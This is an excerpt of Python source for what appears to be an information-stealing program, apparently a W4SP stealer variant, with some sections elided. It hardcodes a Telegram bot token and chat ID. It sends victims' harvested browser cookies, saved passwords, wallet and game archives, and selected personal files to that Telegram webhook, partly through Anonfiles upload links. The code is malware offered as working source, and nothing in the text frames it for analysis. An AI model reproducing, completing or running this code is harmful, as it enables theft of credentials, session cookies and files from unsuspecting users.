...
token = "6116316698:AAGw7pYXFmFbMUjvh3ednJjlYfjn876O8Lg"
chatid = "5976658431"
hook = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text='
DETECTED = False
...
def LoadUrlib(hook, data=''):
    requests.post(hook+urllib.parse.quote(data))
...
def upload(name, link):
    ...
    if name == "wpcook":
        parsed = uploadToAnonfiles(os.getenv("TEMP") + "\\" + "wpparsed.txt")

        data = f"""Found {CookiCount} Cookies\n\nLink: {link}\nParsed: {parsed}"""
        LoadUrlib(hook, data=data)
        return

    if name == "wppassw":

        data = f"""Found {PasswCount} Passwords\n\nLink: {link}"""
        LoadUrlib(hook, data=data)
        return

    if name == "kiwi":

        data = f"Interesting files found on user PC:\n{link}"
        LoadUrlib(hook, data=data)
        return
...
def GatherZips(paths1, paths2, paths3):
    ...
    LoadUrlib(hook, data=f"W4SP Zips\n{wal}\n{ga}\n{ot}", )
...
def parseCookies():
    try:
        ...
        writeforfile(tmpCookies, 'parsed')
    except:pass
    ...
    for arg in KiwiFiles:
        if len(arg[2]) != 0:
            ...
            for ffil in foldlist:
                ...
                fileanme = a[len(a)-1]
                b = ffil[1]
                filetext += f"└─📂 {fileanme}: {b if b else ''}\n"
            filetext += "\n"
